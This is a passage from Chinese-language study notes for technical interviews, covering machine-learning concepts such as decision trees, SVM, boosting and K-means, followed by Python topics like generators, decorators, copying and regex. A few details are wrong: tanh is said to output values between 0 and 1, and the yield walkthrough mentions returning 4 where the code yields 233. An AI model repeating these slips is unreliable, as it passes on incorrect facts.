      * 反最大池化

        反最大池化需要记录池化时最大值的位置

        ![image-20200326150343129](/Users/godspeed/Library/Application Support/typora-user-images/image-20200326150343129.png)

      * 反平均池化

        ![image-20200326145939673](/Users/godspeed/Library/Application Support/typora-user-images/image-20200326145939673.png)

- **下采样（downsampling)**

  * 目的
    * 使得图像符合显示区域的大小
    * 生成对应图像的缩略图
    * 降低特征的维度并保留有效信息
    * 一定程度上避免过拟合
  * 方法（举例）
    * 卷积
    * 池化

- 相关问题：为什么有时候我们需要先进行下采样，然后再进行上采样呢，不是多此一举吗？

  > 个人看法

  先缩小图片可以去除噪声，随后的上采样可以最大程度的保留图像的细节。

#### 5、贝叶斯算法和朴素贝叶斯算法有什么区别？ 

朴素（Naive）：特征与特征之间相互独立

#### 6、决策树（Decision Tree，DT）

> 概念比较多

* 先构建树，然后做决策

* 方法：

  * 当一个节点满足的属性不足以划分样本的时候，继续向下划分（1分为2）
  * 选择适当的阈值使得分类错误率最小

* 例子

  | 学号 | 分数 | 出勤率 | 回答问题次数 | 作业提交率 | 分类：是否是好学生 |
  | :--: | :--: | :----: | :----------: | :--------: | :----------------: |
  |  1   |  99  |  80%   |      5       |    90%     |        yes         |
  |  2   |  89  |  100%  |      6       |    100%    |        yes         |
  |  3   |  69  |  100%  |      7       |    100%    |         no         |
  |  4   |  50  |  60%   |      8       |    70%     |         no         |
  |  5   |  95  |  70%   |      9       |    80%     |         no         |
  |  6   |  98  |  60%   |      10      |    80%     |        yes         |
  |  7   |  92  |  65%   |      11      |    100%    |        yes         |
  |  8   |  91  |  80%   |      12      |    85%     |        yes         |
  |  9   |  85  |  80%   |      13      |    95%     |        yes         |
  |  10  |  85  |  91%   |      14      |    98%     |        yes         |

  我们可以根据上面的信息，画出一棵树来帮助我们决策。

  ![image-20200406191453302](/Users/godspeed/Library/Application Support/typora-user-images/image-20200406191453302.png)

  通过学习上表的数据，可以设置A，B，C，D，E的具体值，而A，B，C，D，E称为阈值。当然，我们可以换一下每个节点的顺序，得到不同的树。

  

* 一堆概念：

  * 熵entropy（中学学的混乱度）

  $$
  熵=-\sum_{i=1}^{n}P(i)log_2P(i)
  $$

  * 信息增益Gain：
    
    划分前样本集合D的熵 ——entropy(前)
    

  使用某个特征A划分数据集D，得到k个子集$D_1,D_2,...D_k$。计算划分后的数据子集的熵 ——entropy(后)
  $$
    \Delta=entropy(前) -  entropy(后)\\\operatorname{Gain}(D, A)=\operatorname{Ent}(D)-\sum_{i=1}^{k} \frac{\left|D^{i}\right|}{|D|} \operatorname{Ent}\left(D^{i}\right)
  $$
    |D|表示数据集D的大小

  * 信息增益率Gain ratio:
    $$
    Gain\_ratio(D, A)=\frac{\operatorname{Gain}(D, A)}{I V(A)}
    \\
    IV(A)=-\sum_{i=1}^{k} \frac{| D^{i}|}{|D|} \log _{2} \frac{\left|D^{i}\right|}{|D|}
    $$

  * Gini系数
    $$
    \operatorname{Gini}(\mathrm{D})=1-\sum_{i=1}^{k}\left(\frac{\left|D_{i}\right|}{|D|}\right)^{2}
    $$
    这里再举一个例子,我们看哪些因素决定我们去不去打篮球。

    | Day  | Outlook  | Temp. | Humidity |  Wind  | Decision |
    | :--: | :------: | :---: | :------: | :----: | :------: |
    |  1   |  Sunny   |  Hot  |   High   |  Weak  |    No    |
    |  2   |  Sunny   |  Hot  |   High   | Strong |    No    |
    |  3   | Overcast |  Hot  |   High   |  Weak  |   Yes    |
    |  4   |   Rain   | Mild  |   High   |  Weak  |   Yes    |
    |  5   |   Rain   | Cool  |  Normal  |  Weak  |   Yes    |
    |  6   |   Rain   | Cool  |  Normal  | Strong |    No    |
    |  7   | Overcast | Cool  |  Normal  | Strong |   Yes    |
    |  8   |  Sunny   | Mild  |   High   |  Weak  |    No    |
    |  9   |  Sunny   | Cool  |  Normal  |  Weak  |   Yes    |
    |  10  |   Rain   | Mild  |  Normal  |  Weak  |   Yes    |
    |  11  |  Sunny   | Mild  |  Normal  | Strong |   Yes    |
    |  12  | Overcast | Mild  |   High   | Strong |   Yes    |
    |  13  | Overcast |  Hot  |  Normal  |  Weak  |   Yes    |
    |  14  |   Rain   | Mild  |   High   | Strong |    No    |

    | Outlook  | Yes  |  No  | Number of instances |
    | :------: | :--: | :--: | :-----------------: |
    |  Sunny   |  2   |  3   |          5          |
    | Overcast |  4   |  0   |          4          |
    |   Rain   |  3   |  2   |          5          |

    $$
    \begin{aligned}
    Gini(Outlook=Sunny) &= 1 – (\frac{2}{5})^2 – (\frac{3}{5})^2 = 1 – 0.16 – 0.36 = 0.48
    \\
    Gini(Outlook=Overcast) &= 1 – (\frac{4}{4})^2 – (\frac{0}{4})^2 = 0
    \\
    Gini(Outlook=Rain) &= 1 – (\frac{3}{5})^2 – (\frac{2}{5})^2 = 1 – 0.36 – 0.16 = 0.48
    \end{aligned}
    $$

* 三种决策树：

  * ID3

    思想：熵减小的越快越好，该决策树会把熵减最大的分类方法作为根节点。

    缺点：如果我们数据集中的某个属性值对不同的样本基本上是不相同的，如果我们用这个属性来划分数据集，它会得到很大的信息增益，比如我们例子中的学号，我们可能会得到“学号为3、4、5的都是坏学生”这样的分类方法，虽然他确实没分类错，但是常识告诉我们学号和该生是不是好学生没有必然联系。

  * C4.5

    思想：ID3会产生过拟合的问题。需要使用信息增益率来解决。

    缺点：增益率准则对属性取值较少的时候会有偏好，为了解决这个问题，C4.5并不是直接选择增益率最大的属性作为划分属性，而是之前先通过一遍筛选，先把信息增益低于平均水平的属性剔除掉，之后从剩下的属性中选择信息增益率最高的，这样的话，相当于两方面都得到了兼顾。

  * CART（Classification adn Regression Tree, 分类回归决策树）

    CART是个二叉树,既可以做回归问题也可以做分类问题


#### 7、随机森林（Random Forest）

我们知道森林是多棵树，这里的树就是之前提到的决策树，不过他加入了随机的性质

* 随机
  * 第一重随机：选样本随机，如给定样本1,2,3...10，选60%的数据[1,3,5,1,2,8]
  * 第二重随机：选特征随机
* 具体算法：
  * 用N来表示训练用例（样本）的个数，M表示特征数目。
  * 输入特征数目m，用于确定决策树上一个节点的决策结果；其中m应远小于M。
  * 从N个训练用例（样本）中以有放回抽样的方式，取样N次，形成一个训练集（即bootstrap取样），并用未抽到的用例（样本）作预测，评估其误差。
  * 对于每一个节点，随机选择m个特征，决策树上每个节点的决定都是基于这些特征确定的。根据这m个特征，计算其最佳的分裂方式。
  * 每棵树都会完整成长而不会剪枝。

#### 8、支持向量机（Support Vector Machine，SVM）

![image-20200407113833613](/Users/godspeed/Library/Application Support/typora-user-images/image-20200407113833613.png)

看到这张图，最直观的感受就是我们在找这样的一条直线（超平面），将不同的样本分割开来，同时，让样本离直线的距离尽可能的远，有一个专业术语叫最大间隔（Maxmium Margin）。

距离超平面最近的这几个训练样本点恰好在虚线上，它们被称为"支持向量" (support vector)。

还记得我们平面空间里点($(x_0,y_0)$)到直线($Ax+By+C=0$)的距离公式
$$
d=\left|\frac{A x_{0}+B y_{0}+C}{\sqrt{A^{2}+B^{2}}}\right|
$$
因此，二维的样本空间中，任意点x 到超平面的距离可写为
$$
d=\left|\frac{w^Tx+b}{\sqrt{w_1^2+w_2^2}}\right|=\frac{|w^Tx+b|}{||w||}
$$
我们想让$\gamma = \frac{2}{||w||}$尽可能的大，即让$||w||$尽可能的小。研究者喜欢使用如下的形式（重点！为了数学上的便利，Mathematical Convenience），这种表示形式与最小化$||w||$是等价的。


$$
\frac{1}{2}||w||^2
$$
之后就是一些比较晦涩的数学推导了，这里不谈。推导视频可看参考资料[12]。

<u>相关问题</u>

**什么时候用线性核？什么时候用高斯核？**

当数据的特征提取的较好,所包含的信息量足够大,很多问题是线性可分的那么可以采用线性核。

若特征数较少,样本数适中,对于时间不敏感,遇到的问题是线性不可分的时候可以使用高斯核来达到更好的效果。

**硬间隔和软间隔**

硬间隔比较死板，对噪声样本处理的不好。

软间隔引入松弛变量，提高对噪声样本的容忍程度。

**几何距离与函数距离**



#### 9、RCNN、Fast-RCNN、Faster-RCNN、Mask-RCNN

* 传统的滑动窗口速度很慢，需要暴力枚举宽、高

* RCNN

  * 流程

    对原图采用选择性搜索selective search，得到1000～2000个ROI（Region of Interest），然后缩放到合适大小，送到CNN进行特征提取，拿到SVM里进行分类

  * 缺点

    需要事先提取多个候选区域对应的图像，重叠带来重复计算；对选出来的图片会有个缩放的过程，会影响特征提取的预期结果；selective search耗时

* Fast-RCNN

  * 流程

    对原图采用选择性搜索selective search，得到1000～2000个ROI（Region of Interest），把原图丢到CNN中得到特征图，根据ROI在特征图上对应位置选，然后缩放到合适大小，拿到SVM里进行分类

  * 缺点

    selective search耗时

* Faster-RCNN（RPN+FPN+Fast-RCNN）

  * 流程

    使用RPN（Region Proposal Network，区域建议网络）取代selective search，它的核心是对于该图像的每一个位置，考虑9个可能的候选窗口，最后我们会得到一些ROI。

    对原图使用FPN（Feature Pyramid Network，特征金字塔网络）提取浅层（比较具体）、深层（比较抽象）等多层次的特征图，并进行特征融合。

    根据ROI的大小在FPN得到的多个特征图上找对应的区域，然后缩放到合适大小，拿到SVM里进行分类

* Mask-RCNN 加入了Mask Prediction 层可以对每个像素分类



#### 10、梯度消失/梯度爆炸什么意思？

梯度消失：sigmoid 激活函数在反向传播时，多个sigmoid导数相乘，$\left|\sigma^{\prime}(z) w\right|<1$使得结果越来越小

梯度爆炸：sigmoid 激活函数在反向传播时，多个sigmoid导数相乘,w比较大，$\left|\sigma^{\prime}(z) w\right|>1$使得结果越来越大



#### 11、怎么防止过拟合

* 获取更多数据

  * 数据增强（Data Augmentation）

    通过图像平移、翻转、缩放、切割等手段将数据库成倍扩充

  * 人工采集数据！！

* Batch Normalization

  * 在神经网络训练过程中使得每一层神经网络的输入保持相同分布

* 正则化（regularization）

  * L1正则
    * $L=L_0+\frac{\lambda}{m}\sum_{i=1}^{m} |w_{i}|$
    * 假设模型中有很多特征，其中不乏相关性特征，可以用L1消除共线性问题
  * L2正则
    * $L=L_0+\frac{\lambda}{2m} \sum_{i=1}^{m} w_{i}^{2}$
    * 限制参数过多或者过大，避免模型更加复杂，适用于数据充足的场景下防止过拟合

* dropout（神经网络的节点在训练过程中以一定概率如$50\%$不参与训练，罢工）

  * 为什么？答：防止参数过分依赖训练数据，减少神经元之间复杂的共适应关系，增加参数对数据集的泛化能力。

* Bagging（Bootstrap Aggregation）

  * bootstrap是有放回的采样
  * 算法流程：
    * 原始样本集中抽取训练集。每轮从原始样本集中使用Bootstrap的方法抽取n个训练样本（在训练集中，有些样本可能被多次抽取到，而有些样本可能一次都没有被抽中）。共进行k轮抽取，得到k个训练集。（k个训练集之间是相互独立的）
    * 每次使用一个训练集得到一个模型，k个训练集共得到k个模型。（注：这里并没有具体的分类算法或回归方法，我们可以根据具体问题采用不同的分类或回归方法，如决策树）
    * 对分类问题：将上步得到的k个模型采用投票的方式得到分类结果；对回归问题，计算上述模型的均值作为最后的结果。

* Boosting

  既然训练复杂神经网络比较慢，那我们就可以只使用简单的神经网络（层数、神经元数限制等）。通过训练一系列简单的神经网络，加权平均其输出。

  核心的思想是“三个臭皮匠，顶过诸葛亮”。

  * 流程：（类似电路中的串联）
    * 首先从训练集用初始权重训练出一个弱学习器1，他可以弱到稍微比随机猜好那么一丢丢。
    * 根据弱学习的学习误差率表现来更新训练样本的权重，使得之前弱学习器1学习误差率高的训练样本点的权重变高，使得这些误差率高的点在后面的弱学习器2中得到更多的重视。
    * 基于调整权重后的训练集来训练弱学习器2
    * 如此重复进行，直到弱学习器数达到事先指定的数目T，最终将这T个弱学习器通过集合策略进行整合，得到一个强的学习器

  * 典型算法（概述）
    * AdaBoost（Adaptive Boost——数据挖掘十大算法之一）
      * AdaBoost 改变了训练数据的权值,即样本的概率分布,减少上一轮被正确分类的样本权值,提高被错误分类的样本权值
    * GBDT（Gradient Boosting Decision Tree）
      * GBDT 是目前竞赛中最为常用的一种机器学习算法，因为它不仅可以适用于多种场景，更难能可贵的是，GBDT 有着出众的准确率。
      *  gbdt通过多轮迭代,每轮迭代产生一个弱分类器，每个分类器在上一轮分类器的**残差**基础上进行训练，使用的是一阶导数，即梯度
    * XGBOOST（eXtreme Gradient Boosting，Kaggle 神器）
      * 使用了二阶泰勒展开

  

#### 12、boosting和bagging的区别？

|          |                           bagging                            |                           boosting                           |
| :------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
| 样本选择 | 训练集是在原始集中有放回选取的，从原始集中选出的各轮训练集之间是独立的 | 每一轮的训练集不变，只是训练集中每个样例在分类器中的权重发生变化。而权值是根据上一轮的分类结果进行调整 |
| 样例权重 |               使用均匀取样，每个样例的权重相等               |      根据错误率不断调整样例的权值，错误率越大则权重越大      |
| 预测函数 |                    所有预测函数的权重相等                    | 每个弱分类器都有相应的权重，对于分类误差小的分类器会有更大的权重。 |
| 并行计算 |                   各个预测函数可以并行生成                   | 每个预测函数只能顺序生成，后一个模型的参数需要前一轮模型的成果。 |
|   目的   |                     降低模型的 variance                      |                       降低模型的 bias                        |



#### 13、讲讲K-means 算法的实现流程？

> 物以类聚，人以群分
>
> 宇宙大爆炸后，所有星球没有归属，越大的天体，引力越强，在他周围，开始有星球被他吸引，随着时间流逝，形成了我们现在那么多的星系，银河系只是其中一个。

输入：n个样本点 如（x1,y1）... (xn,yn)

输出：k个聚类

处理流程：    

（1） 从 n个数据对象随机选择 k 个样本点作为初始聚类中心；

（2） 根据每个聚类中心，计算每个样本点与这些聚类中心的距离，并根据最小距离对样本重新进行划分；例如，某一点到第一个聚类最近，我们就把它先归为第一类

（3） 我们得到每个点各自的类别，此时计算每个类别中所有点的中心，又得到了k个聚类中心

（4）循环（2）到（3）直到每个聚类不再发生变化为止



#### 14、什么是回归问题？什么是分类问题？

![img](https://img-blog.csdn.net/20160930051801241?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)

> 上面的图太大了，暂时消化不了没关系。

* 无论是分类还是回归，都是想建立一个预测模型 ，给定一个输入 , 可以得到一个输出 
* 在分类问题中, 是离散的（这张图片是猫🐱还是狗🐶）; 
  * 分类问题最常用的学习算法包括 SVM (支持向量机) , SGD (随机梯度下降算法), Bayes (贝叶斯估计), Ensemble, KNN（K-最近邻） 等。
* 在回归问题中是连续的（明天的温度、股市的价格、房价等等）
  * 回归问题也能使用 SVR（支持向量机回归）, SGD（随机梯度下降算法）, Ensemble 等算法，以及其它线性回归算法。



#### 15、线性回归和逻辑回归的区别？

* 线性回归（Linear Regression）

  * 知道图上的一些数据点，用一根曲线去拟合。当我们找到这样一条曲线后，给出一条未知数据，我们可以预测他在曲线上的位置

* 逻辑回归（Logistic Regression）

  * 首先，要注意的是逻辑回归解决的是分类问题，而不是回归问题，虽然它名字里有回归

  * 引入sigmoid函数🙂️
    $$
    y=h_θ(x) = \frac{1}{1+e^{-θ^Tx}}
    
    ,其中θ^T = [θ_0,θ_1...θ_n],x是我们的输入，用列向量表示
    $$
    因为函数的特性，不管输入什么x值，y值都会是在（0,1）的范围内。

  * 当y值>0.5时我们认为它属于分类1⃣️，当y值小于0.5时我们认为它属于分类2⃣️

  * 逻辑回归引入sigmoid函数，把y值从线性回归的(−∞,+∞)限制到了（0,1）的范围。

#### 16、了解卷积神经网络吗？

> 不细讲，问的概率略低，有兴趣自行了解

卷积神经网络（CNN）【Convolution Neural Network】

由输入层、卷积层、激活函数、池化层、全连接层、输出层组成

* 输入层：对原始图像数据进行预处理

* 卷积层：名字的来由，使用过滤器进行特征提取

* 激活函数：常见的有sigmoid函数、tanh函数、ReLU函数

  * sigmoid

    * 优点：将线性函数转变为非线性函数，输出为 0 到 1 之间的连续实值
    * 缺点：幂运算相对来讲比较耗时，容易出现梯度消失的问题

    $$
    σ(x) = \frac{1}{1+e^{-x}}
    $$

  * tanh

    * 优点：将线性函数转变为非线性函数，输出为 0 到 1 之间的连续实值，在训练过程中收敛速度更快
    * 缺点：幂运算相对来讲比较耗时，容易出现梯度消失的问题

    $$
    tanh(x) = 2σ(2x) - 1
    $$

  * ReLU

    * 优点：解决了梯度消失的问题，计算速度和收敛速度非常快
    * 缺点：神经元死亡

    $$
    f(x) = max(0,x)
    $$

* 池化层：通过池化来降低卷积层输出的特征向量，同时改善结果，不易出现过拟合

* 全连接层：连接所有的特征，将输出值送给分类器。

#### 17、什么是浅层神经网络？

One hidden layer Neural Network

浅层神经网络即是“层次较少”的神经网络，虽然层次少但其性能相对单神经元更强大。

一般包括输入层、隐藏层、输出层。





### 十、python

#### 1.yield关键字的作用

```python
def gen():
    print("starting...")
    while True:
        res = yield 233
        print("res:",res)
g = gen()
print(g.next())
print("-"*20)
print(g.next())

"""
starting...
233
--------------------
('res:', None)
233
"""
```

* 有yield的函数不再是函数了，我们管它叫生成器
* yield可以理解为return，返回之后程序就不再往下运行了。

* 具体执行流程：
  * 程序开始执行以后，因为gen函数中有yield关键字，所以gen函数并不会真的执行，而是先得到一个生成器g(相当于一个对象)
  * 直到调用next方法，gen函数正式开始执行，先执行gen函数中的print方法，然后进入while循环
  * 程序遇到yield关键字，然后把yield想成return,return了一个233之后，程序停止，并没有执行赋值给res操作，此时g.next()语句执行完成，所以输出的前两行（第一个是while上面的print的结果,第二个是return出的结果）
  * 程序执行`print("-"*20)`，输出20个`-`
  * 重点来了：现在开始执行下面的print(g.next()),不同的是，这个时候是从前面那个g.next()停止的地方开始执行的，也就是要执行res的赋值操作，这时候要注意，这个时候赋值操作的右边是没有值的（因为刚才那个是return出去了，并没有给赋值操作的左边传参数），所以这个时候res赋值是None,所以接着下面的输出就是`('res:', None)`
  * 程序会继续在while里执行，又一次碰到yield,这个时候同样return 出4，然后程序停止，print函数输出的4就是这次return出的4.

#### 2、python中*args和**kwargs的区别

*    *args 用来将参数打包成tuple给函数体调用
*    **kwargs 打包关键字参数成dict给函数体调用
*   注意点：参数`arg、*args、**kwargs`三个参数的位置必须是一定的。必须是`(arg,*args,**kwargs)`这个顺序，否则程序会报错。

```python
def func1(arg):
	print (arg)

def func2(*args):
	print (args)

def func3(**kargs):
	print (kargs)

def func4(arg,*args,**kargs):
	print(arg,args,kargs)

func1(1)
func2(2,3,4,5)
func3(a=5,b=6,c=7,d=8)
func4(1,2,3,4,a=5,b=6,c=7,d=8,e=9)

"""
1
(2, 3, 4, 5)
{'a': 5, 'c': 7, 'b': 6, 'd': 8}
(1, (2, 3, 4), {'a': 5, 'c': 7, 'b': 6, 'e': 9, 'd': 8})
"""
```



#### 3、python的装饰器

> 这可能是python中最难掌握的概念之一。

**概念引入**

* 我们直接来看一个例子，例子中我们在decorator函数里又定义了一个函数,他使得我们可以在test函数之前和之后插入代码

```python
def decorator(func):
    def wrapTheFunction():
        print("before executing func()")
        func()
        print("after executing func()")
    return wrapTheFunction
def test():
    print("test called")

test = decorator(test) 
test()
"""
before executing func()
test called
after executing func()
"""
```

* 换一种写法看看，唯一美中不足的是他把我们的函数名都改了

```python
def decorator(func):
    def wrapTheFunction():
        print("before executing func()")
        func()
        print("after executing func()")
    return wrapTheFunction

@decorator
def test():
    print("test called")
 
test()
print (test.__name__)

"""
before executing func()
test called
after executing func()
wrapTheFunction
"""
```

python提供了一个函数来解决这个问题,**@wraps**接受一个函数来进行装饰，并加入了复制函数名称、注释文档、参数列表等等的功能

````python
from functools import wraps
def decorator(func):
    @wraps(func)
    def wrapTheFunction():
        print("before executing func()")
        func()
        print("after executing func()")
    return wrapTheFunction

@decorator
def test():
    print("test called")
 
test()
print (test.__name__)

"""
before executing func()
test called
after executing func()
test
"""
````

**带参数的装饰器**

我们来添加参数看看,一个携带了参数的装饰器将有三层函数

```python
from functools import wraps
def decorator(arg):
	print(arg)
	def six(func):
		@wraps(func)
		def wrapTheFunction():
			print("before executing func()")
			func()
			print("after executing func()")
		return wrapTheFunction
	return six

@decorator('666')
def test():
	print("test called")
 
test()
print (test.__name__)

"""
666
before executing func()
test called
after executing func()
test
"""
```

你一定会疑惑test是怎么传进去的,下面的代码其实是等价的

```python
from functools import wraps
def decorator(arg):
	print(arg)
	def six(func):
		@wraps(func)
		def wrapTheFunction():
			print("before executing func()")
			func()
			print("after executing func()")
		return wrapTheFunction
	return six

def test():
	print("test called")
 
decorator('666')(test)()

"""
666
before executing func()
test called
after executing func()
"""
```

**更加复杂一些**

让我们写的更加晦涩一点

```python
from functools import wraps
def decorator(arg):
	print(arg)
	def six(func):
		@wraps(func)
		def wrapTheFunction(*args,**kargs):
			print("before executing func()")
			print(args,kargs)
			print("after executing func()")
			return func(*args,**kargs)
		return wrapTheFunction
	return six

def test(*args,**kargs):
	print("test called")
 
decorator('666')(test)(1,2,c=3,d=4)
"""
666
before executing func()
((1, 2), {'c': 3, 'd': 4})
after executing func()
test called
"""
```

然后写成装饰器

```python
from functools import wraps
def decorator(arg):
	print(arg)
	def six(func):
		@wraps(func)
		def wrapTheFunction(*args,**kargs):
			print("before executing func()")
			print(args,kargs)
			print("after executing func()")
			return func(*args,**kargs)
		return wrapTheFunction
	return six

@decorator('666')
def test(*args,**kargs):
	print("test called")
 
test(1,2,c=3,d=4)
"""
666
before executing func()
((1, 2), {'c': 3, 'd': 4})
after executing func()
test called
"""
```

#### 4、Python是如何进行内存管理的？

> 扩展内容，一般不问

* 对象的引用计数机制

   Python内部使用引用计数，来保持追踪内存中的对象，所有对象都有引用计数。

  * 引用计数增加的情况： 

    * 一个对象分配一个新名称 

      ```python
      >>> a='test test'
      >>> b=a
      ```

    * 将其放入一个容器中（如列表、元组或字典）

      ```python
      >>> a=2
      >>> sys.getrefcount(a)
      86
      >>> s=[a]
      >>> sys.getrefcount(a)
      87
      >>> a='hello python' #本身+1
      >>> sys.getrefcount(a) #函数调用再+1
      2
      >>> a='python'
      >>> sys.getrefcount(a)
      5
      ```

      `sys.getrefcount()`函数可以获得对象的当前引用计数, 有趣的事，引用计数往往比你猜测得要大得多。这是因为对于不可变数据（如一些小整数和字符串），解释器会在程序的不同部分共享内存，以节约内存。

  * 引用计数减少的情况： 

    * 使用del语句对对象别名显示的销毁 

      ```python
      >>> a='test test'
      >>> sys.getrefcount(a)
      2
      >>> b=a
      >>> sys.getrefcount(a)
      3
      >>> sys.getrefcount(b)
      3
      >>> del(b)
      >>> sys.getrefcount(a)
      2
      ```

    * 引用超出作用域或被重新赋值 

* 垃圾回收机制
  * 当一个对象的引用计数归零时，它将被垃圾收集机制处理掉。 
  * 当两个对象a和b相互引用时，del语句可以减少a和b的引用计数，并销毁用于引用底层对象的名称。然而由于每个对象都包含一个对其他对象的应用，因此引用计数不会归零，对象也不会销毁。（从而导致内存泄露）。为解决这一问题，解释器会定期执行一个循环检测器，搜索不可访问对象的循环并删除它们。(还挺智能)

* 内存池机制

  Python提供了对内存的垃圾收集机制，但是它将不用的内存放到内存池而不是返回给操作系统。 

  * Pymalloc机制。为了加速Python的执行效率，Python引入了一个内存池机制，用于管理对小块内存的申请和释放。 
  * Python中所有小于256个字节的对象都使用pymalloc实现的分配器，而大的对象则使用系统的malloc。
  * 对于Python对象，如整数，浮点数和列表，都有其独立的私有内存池，对象间不共享他们的内存池。也就是说如果你分配又释放了大量的整数，用于缓存这些整数的内存就不能再分配给浮点数。

#### 5、什么是lambda函数？它有什么好处?

lambda 表达式，通常是在需要一个函数，但是又不想费神去命名一个函数的场合下使用，也就是指匿名函数 

```python
>>> g=lambda x:x**3
>>> g(3)
27
```

#### 6、赋值，浅拷贝，深拷贝的区别

* 赋值（=），其实就是创建了对象的一个引用，修改其中任意一个变量都会影响到另一个，要注意以下两个情况的区别

  * 对于不可变对象，修改变量的值意味着在内存中要新创建一个数据对象,因此,对于不可变对象，变量之间<u>不会相互影响</u>

  ```python
  >>> a=9999888777
  >>> b=a
  >>> id(a)
  140253331485168
  >>> id(b)
  140253331485168
  >>> b=777888999
  >>> id(b)
  140253331485264
  >>> id(a)
  140253331485168
  >>> (a,b)
  (9999888777, 777888999)
  ```

  * 对于可变对象，变量之间是<u>相互影响</u>的

  ```python
  >>> a=[1,2,3,4]
  >>> b=a
  >>> (id(a),id(b))
  (4382056320, 4382056320)
  >>> b.append(5)
  >>> (a,b)
  ([1, 2, 3, 4, 5], [1, 2, 3, 4, 5])
  ```

  

* 浅拷贝：创建一个新的对象，但它包含的是对原始对象中包含项的引用（如果用引用的方式修改其中一个对象，另外一个也会修改改变）

  * 完全切片方法

    ```python
    >>> a
    [1, 2, 3, 4, 5]
    >>> b=a[:]
    >>> b
    [1, 2, 3, 4, 5]
    >>> id(a)
    4382056320
    >>> id(b)
    4382279656
    >>> a.append(6)
    >>> a
    [1, 2, 3, 4, 5, 6]
    >>> b
    [1, 2, 3, 4, 5]
    ```

  * 工厂函数，如list()

    ```python
    >>> a=[1,2,3,4]
    >>> b=list(a)
    >>> b
    [1, 2, 3, 4]
    >>> a.append(5)
    >>> a
    [1, 2, 3, 4, 5]
    >>> b
    [1, 2, 3, 4]
    ```

  * copy模块的copy()函数

    ```python
    >>> import copy
    >>> a=[1,2,3,4]
    >>> b=copy.copy(a)
    >>> b.append(5)
    >>> b
    [1, 2, 3, 4, 5]
    >>> a
    [1, 2, 3, 4]
    ```

* 深拷贝：创建一个新的对象，并且递归的复制它所包含的对象（修改其中一个，另外一个不会改变）

  * copy模块的deep.deepcopy()函数

    ```python
    >>> import copy
    >>> a=[1,2,3,4]
    >>> b=copy.deepcopy(a)
    >>> (id(a),id(b))
    (4545666224, 4545666368)
    >>> a.append(5)
    >>> b
    [1, 2, 3, 4]
    >>> a
    [1, 2, 3, 4, 5]
    ```

    细心的同学应该发现这不和上面的浅拷贝一样么，我们再来看一个例子

    ```python
    >>> import copy
    >>> a=[[1,2,3],[4,5,6]]
    >>> b=copy.copy(a)
    >>> a[0][0]='test'
    >>> a
    [['test', 2, 3], [4, 5, 6]]
    >>> b
    [['test', 2, 3], [4, 5, 6]]
    
    
    
    >>> c=copy.deepcopy(a)
    >>> c
    [['test', 2, 3], [4, 5, 6]]
    >>> a
    [['test', 2, 3], [4, 5, 6]]
    >>> a[0][0]='deep'
    >>> a
    [['deep', 2, 3], [4, 5, 6]]
    >>> b
    [['deep', 2, 3], [4, 5, 6]]
    >>> c
    [['test', 2, 3], [4, 5, 6]]
    ```

#### 7、用Python匹配HTML tag的时候，<.\*>和<.\*?>有什么区别？

- `?`在一般正则表达式里的语法是指得"零次或一次匹配左边的字符或表达式"相当于`{0,1}`
- 而当`?`后缀于`*,+,?,{n},{n,},{n,m}`之后，则代表非贪心匹配模式，也就是说，尽可能少的匹配左边的字符或表达式，这里是尽可能少的匹配`.`(任意字符)

贪婪匹配`<.*>` 

非贪婪匹配`<.*?>`

```python
>>> import re
>>> re.findall("<.*>","<a>111</a><html>hhhh</html>")
['<a>111</a><html>hhhh</html>']
>>> re.findall("<.*?>","<a>111</a><html>hhhh</html>")
['<a>', '</a>', '<html>', '</html>']
```

如果我们想提取html tag中包围的内容，可以这样做

```python
>>> re.findall('(<[a-z]+>)(.*?)(</[a-z]+>)', s) #非贪婪
[('<html>', 'hello world', '</html>'), ('<a>', 'aaaa', '</a>'), ('<title>', 'bbb', '</title>')]
>>> re.findall('(<[a-z]+>)(.*)(</[a-z]+>)', s) #贪婪
[('<html>', 'hello world</html> <a>aaaa</a><title>bbb', '</title>')]
>>> [x[1] for x in re.findall('(<[a-z]+>)(.*?)(</[a-z]+>)', s)]
['hello world', 'aaaa', 'bbb']
```

#### 8、python2中xrange和range的区别？

* 相同点：

  range()和xrange()都是在循环中使用，输出结果一样。

* 不同点：

  * range返回的是一个list对象
  * xrange返回的是一个生成器对象(xrange object)，内存空间使用极少。因而性能非常好，所以对有大量整数的生成需求，尽量用xrange。

  注意：在python3 中没有xrange，只有range，python3的range和python2 中的xrange一样。

```python
Python 2.7.16 (default, Dec 13 2019, 18:00:32)
>>> print (range.__doc__)
range(stop) -> list of integers # 返回一个列表
range(start, stop[, step]) -> list of integers

Return a list containing an arithmetic progression of integers.
range(i, j) returns [i, i+1, i+2, ..., j-1]; start (!) defaults to 0.
When step is given, it specifies the increment (or decrement).
For example, range(4) returns [0, 1, 2, 3].  The end point is omitted!
These are exactly the valid indices for a list of 4 elements.
>>> print (xrange.__doc__) # 返回一个xrange对象
xrange(stop) -> xrange object
xrange(start, stop[, step]) -> xrange object

Like range(), but instead of returning a list, returns an object that
generates the numbers in the range on demand.  For looping, this is
slightly faster than range() and more memory efficient. # 更加节省内存
```

```python
Python 3.7.6 (default, Dec 30 2019, 19:38:26)
[Clang 11.0.0 (clang-1100.0.33.16)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> print(range.__doc__)
range(stop) -> range object
range(start, stop[, step]) -> range object # 返回一个range对象

Return an object that produces a sequence of integers from start (inclusive)
to stop (exclusive) by step.  range(i, j) produces i, i+1, i+2, ..., j-1.
start defaults to 0, and stop is omitted!  range(4) produces 0, 1, 2, 3.
These are exactly the valid indices for a list of 4 elements.
When step is given, it specifies the increment (or decrement).
```

#### 9、 print 函数的实现默认是怎么样的？

`sys.stdout.write()`,没有自动换行

```python
>>> print (print.__doc__)
print(value, ..., sep=' ', end='\n', file=sys.stdout, flush=False)

Prints the values to a stream, or to sys.stdout by default.
Optional keyword arguments:
file:  a file-like object (stream); defaults to the current sys.stdout.
sep:   string inserted between values, default a space.
end:   string appended after the last value, default a newline.
flush: whether to forcibly flush the stream.
```

input呢？

`sys.stdin.readline`

#### 9、在except中return后还会不会执行finally中的代码？怎么抛出自定义异常？介绍一下 except 的作用和用法？

会的。

```python
class MyError(Exception):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return (self.value)

def func():
	try:
		a = 10/0
		a = 2+'2'
	except ZeroDivisionError:
		return 'zero'
	except (TypeError,NameError) as err:
		# raise MyError('233')
		print(err)
	finally:
